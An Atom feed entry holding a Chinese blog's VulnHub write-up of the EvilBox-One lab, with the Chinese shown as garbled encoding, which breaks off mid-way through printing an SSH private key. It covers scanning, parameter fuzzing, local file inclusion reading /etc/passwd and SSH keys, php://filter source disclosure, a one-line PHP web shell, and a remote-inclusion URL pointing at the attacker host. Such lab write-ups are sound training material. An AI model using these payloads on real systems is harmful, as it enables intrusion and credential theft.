<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Patrik&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-12T07:12:34.577Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Patrik</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VulnHub-6-EvilBox-one</title>
    <link href="http://example.com/2022/04/12/week6/"/>
    <id>http://example.com/2022/04/12/week6/</id>
    <published>2022-04-12T07:12:34.576Z</published>
    <updated>2022-04-12T07:12:34.577Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>é¶æœºï¼š<a href="https://download.vulnhub.com/evilbox/EvilBox---One.ova">https://download.vulnhub.com/evilbox/EvilBox---One.ova</a><br>  éš¾åº¦ï¼šä½â†’ä¸­<br>  ç›®æ ‡ï¼šå–å¾— root æƒé™ + 2 Flag</p></blockquote><span id="more"></span><h3 id="1-ä¸»æœºå‘ç°"><a href="#1-ä¸»æœºå‘ç°" class="headerlink" title="1.ä¸»æœºå‘ç°"></a>1.ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig </span><br><span class="line">#æœ¬æœºIP:192.168.0.110 æ”»å‡»æœºIP</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208193627499-20220106215922469-20220106220051089-20220106221119106.png" alt="image-20211208193627499"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -gaq 192.168.0.0/24</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208195647496.png" alt="image-20211208195647496"></p><p>æ¢æµ‹åˆ°çš„å­˜æ´»ä¸»æœºåˆ—è¡¨ä¸­ï¼Œ192.168.0.108æ˜¯ç›®æ ‡é¶æœºçš„IPåœ°å€</p><h3 id="2-ç«¯å£æ‰«æ"><a href="#2-ç«¯å£æ‰«æ" class="headerlink" title="2.ç«¯å£æ‰«æ"></a>2.ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.0.108</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208195931120.png" alt="image-20211208195931120"></p><p>ç›®æ ‡é¶æœºå¼€æ”¾äº†22ï¼Œ80ç«¯å£</p><h3 id="3-ç«¯å£æœåŠ¡æ¢æµ‹"><a href="#3-ç«¯å£æœåŠ¡æ¢æµ‹" class="headerlink" title="3.ç«¯å£æœåŠ¡æ¢æµ‹"></a>3.ç«¯å£æœåŠ¡æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80 -A 192.168.0.108</span><br><span class="line"># -Aå‚æ•°çš„ä½œç”¨å¤§è‡´ç­‰äº-sV -sC -O,æ¯”è¾ƒæ–¹ä¾¿</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208200300990.png" alt="image-20211208200300990"></p><p>æ‰«æç»“æœæ˜¾ç¤ºç›®æ ‡é¶æœºçš„</p><p>22ç«¯å£å¼€æ”¾äº†sshæœåŠ¡ï¼Œå¹¶åˆ—ä¸¾äº†äº›ä¸åŒæ–¹å¼åŠ å¯†çš„å¯†é’¥ä¿¡æ¯</p><p>80ç«¯å£å¼€æ”¾äº†Apacheçš„WebæœåŠ¡ï¼ŒDebianæ“ä½œç³»ç»Ÿ</p><h3 id="4-è®¿é—®80ç«¯å£"><a href="#4-è®¿é—®80ç«¯å£" class="headerlink" title="4.è®¿é—®80ç«¯å£"></a>4.è®¿é—®80ç«¯å£</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208200757525.png" alt="image-20211208200757525"></p><p>åªæ˜¯ä¸€ä¸ªç®€å•çš„Apacheé¡µé¢ï¼Œæœªå‘ç°æœ‰ç”¨ä¿¡æ¯</p><h3 id="5-çˆ†ç ´22ç«¯å£"><a href="#5-çˆ†ç ´22ç«¯å£" class="headerlink" title="5.çˆ†ç ´22ç«¯å£"></a>5.çˆ†ç ´22ç«¯å£</h3><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208201510674.png" alt="image-20211208201510674"></p><p>å¯¹22ç«¯å£rootç”¨æˆ·çš„å¯†ç è¿›è¡Œäº†çˆ†ç ´ ä½†æœ€ç»ˆæ— æœ</p><h3 id="6-ç›®å½•æ‰«æ"><a href="#6-ç›®å½•æ‰«æ" class="headerlink" title="6.ç›®å½•æ‰«æ"></a>6.ç›®å½•æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.0.108 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204109760.png" alt="image-20211208204109760"></p><p>å‘ç°çš„ç›®å½•&#x2F;æ–‡ä»¶æœ‰ index.html,robots.txt,secret åˆ†åˆ«å°è¯•ï¼š</p><h4 id="1-ip-x2F-index-html"><a href="#1-ip-x2F-index-html" class="headerlink" title="1)ip&#x2F;index.html"></a>1)ip&#x2F;index.html</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208203719626.png" alt="image-20211208203719626"></p><p>ä¸»é¡µäº¦æ˜¯å…ˆå‰çš„80ç«¯å£é»˜è®¤é¡µé¢..</p><h4 id="2-ip-x2F-robots-txt"><a href="#2-ip-x2F-robots-txt" class="headerlink" title="2)ip&#x2F;robots.txt"></a>2)ip&#x2F;robots.txt</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208201957960.png" alt="image-20211208201957960"></p><p>é¡µé¢å†…æ˜¾ç¤ºäº†â€œHello H4x0râ€ï¼Œæ€€ç–‘æ˜¯å¦æ˜¯ç”¨æˆ·åæˆ–è€…è·¯å¾„ï¼Œå°è¯•é’ˆå¯¹ç”¨æˆ·åH4x0rçš„sshå¯†ç çˆ†ç ´ï¼Œç»“æœå¤±è´¥..</p><p>å°è¯•è®¿é—®ip&#x2F;H4x0rç»“æœä¹Ÿæ˜¯å¤±è´¥..</p><h4 id="3-ip-x2F-secret"><a href="#3-ip-x2F-secret" class="headerlink" title="3)ip&#x2F;secret"></a>3)ip&#x2F;secret</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208203843733.png" alt="image-20211208203843733"></p><p>è®¿é—®åå‘ç°æ˜¯ä¸ªç©ºç›®å½•ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ä»»ä½•ä¿¡æ¯..</p><p>å†å¯¹ip&#x2F;secretä¸‹çš„ç›®å½•è¿›è¡Œæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.0.108/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204358197.png" alt="image-20211208204358197"></p><p>å‘ç°äº†&#x2F;secretç›®å½•ä¸‹çš„index.htmlï¼Œevil.php åˆ†åˆ«å°è¯•ï¼š</p><h4 id="4-ip-x2F-secret-x2F-index-html"><a href="#4-ip-x2F-secret-x2F-index-html" class="headerlink" title="4)ip&#x2F;secret&#x2F;index.html"></a>4)ip&#x2F;secret&#x2F;index.html</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204647211.png" alt="image-20211208204647211"></p><p>ç©ºç™½ğŸ˜±..</p><h4 id="5-ip-x2F-secret-x2F-evil-php"><a href="#5-ip-x2F-secret-x2F-evil-php" class="headerlink" title="5)ip&#x2F;secret&#x2F;evil.php"></a>5)ip&#x2F;secret&#x2F;evil.php</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204721125.png" alt="image-20211208204721125"></p><p>ç©ºç™½ğŸ˜±..</p><p>æˆªæ­¢åˆ°ç›®å‰ï¼Œè¿˜æ²¡æœ‰ä»»ä½•ç›´æ¥çš„å‘ç°ï¼Œåœç•™åœ¨æ­¤..ğŸ˜®â€ğŸ’¨</p><h3 id="7-ç»å¢ƒçš„æ±‚æ•‘ä¿¡â€“phpå‚æ•°çˆ†ç ´"><a href="#7-ç»å¢ƒçš„æ±‚æ•‘ä¿¡â€“phpå‚æ•°çˆ†ç ´" class="headerlink" title="7.ç»å¢ƒçš„æ±‚æ•‘ä¿¡â€“phpå‚æ•°çˆ†ç ´"></a>7.ç»å¢ƒçš„æ±‚æ•‘ä¿¡â€“phpå‚æ•°çˆ†ç ´</h3><p>æ€è€ƒğŸ¤”ï¼šphpé¡µé¢æ˜¯å¦‚ä½•å‘æœåŠ¡å™¨ç«¯æäº¤æ•°æ®çš„å‘¢ï¼Ÿ</p><p>Emm:é€šè¿‡ä¸€äº›å‚æ•°èµ‹å€¼</p><p><a href="http://192.168.0.108/secret/evil.php?**a=123&amp;b=456">http://192.168.0.108/secret/evil.php?**a=123&amp;b=456</a>**</p><p>å›å¿†ğŸ¤”ï¼šå¹³æ—¶åšæ”»å‡»ã€æ³¨å…¥ç­‰æ—¶çš„å¤§è‡´æ­¥éª¤éƒ½æ˜¯ï¼Œåœ¨URLå…ˆå¯»æ‰¾å‚æ•°åç§°ï¼Œå†å°è¯•å†™å…¥payloadå®Œæˆæ³¨å…¥ï¼ŒåŒ…æ‹¬ä½¿ç”¨POSTæ–¹æ³•ä¹Ÿæ˜¯å¯»æ‰¾å‚æ•°åœ¨bodyé‡Œå¯»æ‰¾æ•°æ®æ³¨å…¥</p><p>ğŸ’Šå¾—æ•‘çš„å…³é”®å°±æ˜¯â€“&gt;<strong>å¯»æ‰¾æ­£ç¡®çš„å‚æ•°</strong>â€“&gt;<strong>å‚æ•°çˆ†ç ´</strong>ï¼ï¼ï¼ğŸ’£</p><p>ç¡®å®šç›®æ ‡ï¼š</p><p><a href="http://192.168.0.108/secret/evil.php?**cs**=**csz">http://192.168.0.108/secret/evil.php?**cs**=**csz</a>**</p><p>å¯¹<strong>å‚æ•°åä½ç½®</strong>(cs)å’Œ<strong>å‚æ•°å€¼ä½ç½®</strong>(csz)</p><p>å·¥å…·é€‰æ‹©ï¼š</p><p>ç¬¬ä¸€ååº”æ˜¯bpï¼Œä½†æ˜¯è¿™é‡Œä¸ºäº†æ‹“å±•æ­¦å™¨é€‰æ‹©ä½¿ç”¨ffuf</p><p>å­—å…¸é€‰æ‹©ï¼š</p><p>â€‹é’ˆå¯¹å‚æ•°åé€‰æ‹©burp-parameter-names.txt</p><p>â€‹é’ˆå¯¹å‚æ•°å€¼é€‰æ‹©DIYå¤§æ³•ğŸ¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi DIY.txt #æ”¾å…¥ä¸€äº›æ•°å­—ã€å­—æ¯ã€ç¬¦å·</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat DIY.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208211435869.png" alt="image-20211208211435869"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:cs -w DIY.txt:csz -u http://192.168.0.108/secret/evil.php?cs=csz -fs 0</span><br><span class="line">#-wåˆ†åˆ«æŒ‡å®šä¸¤ä¸ªå­—å…¸  </span><br><span class="line">#:ä¸ºäº†åŒºåˆ†å­—å…¸ï¼ŒæŒ‡å®šå‚æ•°</span><br><span class="line">#-fs 0 è¿‡æ»¤æ‰æ— æ•ˆä¿¡æ¯ï¼ˆè¿”å›é¡µé¢ä¸ºç©º 0ï¼‰ï¼Œä½¿ç»“æœæ›´æ¸…æ™°æ˜“è¯»</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208213846947.png" alt="image-20211208213846947"></p><p>ç»“æœå¾ˆä¸ç†æƒ³..ğŸ˜«</p><p>åˆ†æä¸€ä¸‹ï¼š</p><p>åˆšæ‰çš„å‚æ•°åå­—å…¸ä¸­åº”è¯¥æ˜¯æ¶µç›–äº†å¤§éƒ¨åˆ†å¸¸ç”¨å‚æ•°å åº”è¯¥ä¸å­˜åœ¨ç›´æ¥é—®é¢˜âœ…</p><p>åˆšæ‰çš„èµ‹å€¼å­—å…¸æ˜¯æ‰‹åŠ¨è¾“å…¥äº†å‡ ä¸ªå­—æ¯ã€æ•°å­—ã€ç¬¦å· æ€€ç–‘æ˜¯è¿™é‡Œæ‰äº†é“¾å­âŒ</p><p>ç¨å¾®å˜æ¢ä¸€ä¸‹æ€è·¯ï¼š</p><p>åœ¨å‚æ•°åçš„ä½ç½®ä»ä½¿ç”¨burp-parameter-names.txtå­—å…¸ï¼Œå‚æ•°å€¼çš„ä½ç½®æ”¾ç½®ä¸€ä¸ªç›®æ ‡é¶æœºä¸Š<strong>å·²ç»ç¡®å®šå­˜åœ¨çš„æ–‡ä»¶</strong>ï¼Œå½“åœ¨çˆ†ç ´å‚æ•°åçš„è¿‡ç¨‹ä¸­è‹¥å‡ºç°äº†ä¸€ä¸ªå¯ç”¨çš„å‚æ•°åæ—¶ï¼Œé‚£ä¹ˆè¯¥å‚æ•°ä¾¿ä¼šå¼•ç”¨è¯¥<strong>å·²ç»ç¡®å®šå­˜åœ¨çš„æ–‡ä»¶</strong>ï¼Œæ˜¯å¦æœ‰å¯èƒ½åˆ©ç”¨æ–‡ä»¶åŒ…å«è¯»å–æ–‡ä»¶çš„ä¿¡æ¯ï¼Ÿ</p><p>ç»“åˆä¹‹å‰çš„ç›®å½•æ‰«æï¼Œä¸éš¾æƒ³åˆ°è¿™ä¸ª<strong>å·²ç»ç¡®å®šå­˜åœ¨çš„æ–‡ä»¶</strong>ä¸å°±æ˜¯<strong>index.html</strong>å—ï¼Ÿ</p><p>é‡æ–°æ„å»ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.108/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line">#å–æ¶ˆå‚æ•°å€¼çš„å­—å…¸ æ›¿æ¢ä¸º../index.html</span><br><span class="line">#FUZZæ¨¡ç³Šæµ‹è¯•å…³é”®å­—</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208213756058.png" alt="image-20211208213756058"></p><p>ç»“æœæ˜¾ç¤ºï¼šå‚æ•°åç§°commandå¯ç”¨</p><p>æµ‹è¯•è®¿é—®<a href="http://192.168.0.108/secret/evil.php?command=../index.html">http://192.168.0.108/secret/evil.php?command=../index.html</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208214129645.png" alt="image-20211208214129645"></p><p>å¯ä»¥æ­£å¸¸è®¿é—®</p><p>æµ‹è¯•è®¿é—®<a href="http://192.168.0.108/secret/evil.php?command=evil.php">http://192.168.0.108/secret/evil.php?command=evil.php</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208214243394.png" alt="image-20211208214243394"></p><p>è®¿é—®ç»“æœä»ä¸ºç©ºç™½é¡µé¢ï¼ŒæŸ¥çœ‹æºç ä¸º1è¡Œç©ºç™½</p><p>æµ‹è¯•æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p>è®¿é—®<a href="http://192.168.0.108/secret/evil.php?command=../../../../../../../../etc/passwd">http://192.168.0.108/secret/evil.php?command=../../../../../../../../etc/passwd</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208214549193.png" alt="image-20211208214549193"></p><p>ç»“æœæˆåŠŸè¯»å–&#x2F;etc&#x2F;passwdï¼Œè¯´æ˜å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><h3 id="8-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#8-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="8.è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>8.è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><p>å°è¯•åœ¨kaliæ”»å‡»æœºä¸Šæ„é€ ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi a.php</span><br></pre></td></tr></table></figure><blockquote><?php $var=shell_exec($_GET['cmd']); echo $var?></blockquote><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208215246492.png" alt="image-20211208215246492"></p><p>åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«ä¸Šä¼ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start apache2 #åœ¨kaliæœ¬æœºå¼€å¯webæœåŠ¡ å¯åœ¨æ‰§è¡Œå ä½¿ç›®æ ‡å¯ä»¥è®¿é—®åˆ°a.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208215647665.png" alt="image-20211208215647665"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=http://192.168.0.110/a.php?cmd=id</span><br><span class="line">#å°è¯•æ‰§è¡Œidå‘½ä»¤</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208220144981.png" alt="image-20211208220144981"></p><p>å¹¶æ²¡æœ‰è¿”å›ï¼Œå°è¯•äº†lsç­‰å…¶ä»–å‘½ä»¤ä¹Ÿæ²¡æœ‰è¿”å›ï¼Œè¯´æ˜æ­¤å¤„åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ˜¯è¡Œä¸é€šçš„</p><h3 id="9-phpå°è£…å™¨"><a href="#9-phpå°è£…å™¨" class="headerlink" title="9.phpå°è£…å™¨"></a>9.phpå°è£…å™¨</h3><p>phpä½œä¸ºä¸€ç§è¯­è¨€ï¼Œæä¾›è®¸å¤šå…¶ä»–åè®®çš„è®¿é—®æ–¹å¼ã€è®¸å¤šå°è£…å™¨ï¼Œä¾‹å¦‚php:&#x2F;&#x2F; file:&#x2F;&#x2F; ftp:&#x2F;&#x2F; data:&#x2F;&#x2F; zip:&#x2F;&#x2F;</p><p>åˆ©ç”¨php:&#x2F;&#x2F;æ¥è¯»å–ç›®æ ‡ç³»ç»Ÿä¸Šçš„phpæ–‡ä»¶ï¼ˆå½“è®¿é—®ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„phpæ–‡ä»¶æ—¶ï¼Œç›®æ ‡æœåŠ¡å™¨ä¼šä½¿ç”¨phpæ‰§è¡Œä»£ç æ¥å¤„ç†è¯¥æ–‡ä»¶ï¼Œæ•…å¾€å¾€è¯»å–ä¸åˆ°phpæ–‡ä»¶çš„æºç ï¼Œè¯»åˆ°çš„åªæ˜¯ä»£ç æ‰§è¡Œåè¿”å›çš„ç»“æœã€‚ä½†è‹¥æ˜¯å…ˆä½¿ç”¨base64è¿›è¡Œç¼–ç åï¼Œç›®æ ‡æœåŠ¡å™¨æ— æ³•æ­£å¸¸è¯»å–å¯è¯†åˆ«çš„ä»£ç ï¼Œä¸ä½†ä¸ä¼šæ‰§è¡Œè¯¥ä»£ç ï¼Œåè€Œä¼šè¿”å›è¢«base64ç¼–ç åçš„å­—ç¬¦ä¸²ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208221355954.png" alt="image-20211208221355954"></p><p>æˆåŠŸè¿”å›base64ç¼–ç çš„å­—ç¬¦ä¸²ï¼ˆevil.phpæºç ï¼‰</p><blockquote><p>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg&#x3D;&#x3D;</p></blockquote><p>base64è§£ç åï¼š</p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208221618439.png" alt="image-20211208221618439"></p><blockquote><?php$filename = $_GET['command'];   #è¯»å–èµ‹å€¼include($filename);             #å¼•ç”¨è¯»å–åˆ°çš„èµ‹å€¼?></blockquote><p>æµ‹è¯•å‘ç›®æ ‡å†™å…¥èƒ½å¦æˆåŠŸï¼Œå¯èƒ½æ²¡æœ‰å†™å…¥çš„æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n 123 | base64       #å¾—åˆ°123ç»è¿‡base64ç¼–ç çš„å­—ç¬¦</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208222226443.png" alt="image-20211208222226443"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=MTIz</span><br><span class="line">#åˆ©ç”¨php://å°è£…å™¨å°†MTIzè§£ç åå†™å…¥åä¸ºtest.phpçš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208222639627.png" alt="image-20211208222639627"></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208222705794.png" alt="image-20211208222705794"></p><p>è®¿é—®å¤±è´¥ è¯´æ˜åˆšæ‰çš„å†™å…¥æ“ä½œå¤±è´¥äº†..å†æ¬¡é™·å…¥åƒµå±€..</p><h3 id="10-mowree"><a href="#10-mowree" class="headerlink" title="10.mowree?"></a>10.mowree?</h3><p>åˆé‡æ–°ç¿»çœ‹äº†ä¹‹å‰æœé›†åˆ°çš„ä¿¡æ¯ï¼Œå‘ç°åœ¨&#x2F;etc&#x2F;passwdç›®å½•ä¸‹ï¼Œå­˜åœ¨ä¸€ä¸ªåä¸ºmowreeçš„ç”¨æˆ·</p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208223113476.png" alt="image-20211208223113476"></p><p>åªæœ‰ç”¨æˆ·åï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥å†å°è¯•ä¸€ä¸‹sshç™»é™†å¯†ç çˆ†ç ´ï¼Ÿ</p><p>å…ˆç¡®è®¤ä¸€ä¸‹sshç™»é™†çš„è®¤è¯æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -v</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208223554832.png" alt="image-20211208223554832"></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208223639905.png" alt="image-20211208223639905"></p><p>ç»“æœæ˜¾ç¤ºç›®æ ‡æ”¯æŒpasswordå¯†ç è®¤è¯ä»¥å¤–ï¼Œè¿˜æ”¯æŒpublickeyå…¬é’¥èº«ä»½è®¤è¯</p><p>é‚£ä¹ˆè”æƒ³åˆ° ä¸€ä¸ªèƒ½å¤Ÿç™»é™†è¯¥æœåŠ¡å™¨çš„çš„ç”¨æˆ·å¿…ç„¶å­˜åœ¨å…¶ç™»é™†æ‰€ç”¨çš„å…¬é’¥,é‚£ä¹ˆè¯¥å…¬é’¥æ–‡ä»¶ä½äºå“ªé‡Œå‘¢ï¼Ÿ</p><p>æ˜¯å¦å­˜åœ¨äºç”¨æˆ·ç›®å½•æ–‡ä»¶ä¸‹å‘¢ï¼Ÿç»“åˆåˆ©ç”¨æ–‡ä»¶åŒ…å«è¯»æ–‡ä»¶ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/authorized_keys</span><br><span class="line">#.ssh/authorized_keys å·²ç»æˆæƒçš„ç”¨æˆ·çš„é»˜è®¤å…¬é’¥å­˜å‚¨è·¯å¾„</span><br></pre></td></tr></table></figure><p>å¦‚æœèƒ½å¤Ÿè¯»å–åˆ°åˆ™è¯´æ˜æœåŠ¡å™¨æ˜¯å·²æˆæƒå…è®¸è¯¥ç”¨æˆ·ç™»é™†çš„</p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208225112071.png" alt="image-20211208225112071"></p><p>æˆåŠŸè¯»å–åˆ°å­˜æ”¾åœ¨ç›®æ ‡ç”¨æˆ·mowreeç›®å½•ä¸‹çš„å…¬é’¥</p><blockquote><p>ssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud&#x2F;knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV&#x2F;QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH&#x2F;XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</p></blockquote><p>é¡µé¢è¿”å›ä¿¡æ¯ï¼šå…¬ç§é’¥ç”Ÿæˆä½¿ç”¨RSAç®—æ³•ã€ç”¨æˆ·mowreeç™»å½•åˆ°EvilBoxOne</p><p>æ—¢ç„¶å·²ç»è¢«æˆæƒâ€“å­˜åœ¨å…¬é’¥â€“é‚£ä¹ˆæ˜¯å¦ä¹Ÿåº”è¯¥åœ¨é»˜è®¤ç›®å½•ä¸‹å­˜åœ¨ç§é’¥å‘¢ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/id_rsa</span><br><span class="line">#.ssh/id_rsa å·²ç»æˆæƒçš„ç”¨æˆ·çš„é»˜è®¤ç§é’¥å­˜å‚¨è·¯å¾„</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208225724998.png" alt="image-20211208225724998"></p><p>æˆåŠŸè¯»å–åˆ°ç›®æ ‡ç”¨æˆ·mowreeç›®å½•ä¸‹çš„ç§é’¥(å³é”®æºç  æ ¼å¼æ›´ä½³ï¼)</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">&gt;Proc-Type: 4,ENCRYPTED</span><br><span class="line">&gt;DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line"></span><br><span class="line">&gt;uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">&gt;hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">&gt;o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">&gt;+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span 